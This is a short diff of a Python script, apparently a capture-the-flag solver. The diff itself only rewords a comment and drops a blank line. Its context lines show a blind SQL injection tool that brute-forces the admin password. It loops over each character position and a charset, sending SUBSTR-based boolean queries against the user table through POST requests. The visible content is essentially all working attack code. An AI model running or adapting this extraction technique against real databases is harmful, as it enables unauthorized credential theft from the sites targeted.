@@ -22,11 +22,10 @@ contenttype = 'application/x-www-form-urlencoded'
 # ---------------------------------------------------------------------------------------
 if __name__ == '__main__':
 
-	# a silly, serial search blind SQLi tool
+	# stupid serial search    
 	pw     = '';									# store the password here
 	for i in range(1,128):							# for each character				
 		for ch in 'AMM{}_abcdef0123456789ghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
-
 			query = "SUBSTR((SELECT password FROM user WHERE user='admin'), "+str(i)+",1)='"+ch+"'"
 	
 			r = requests.post(
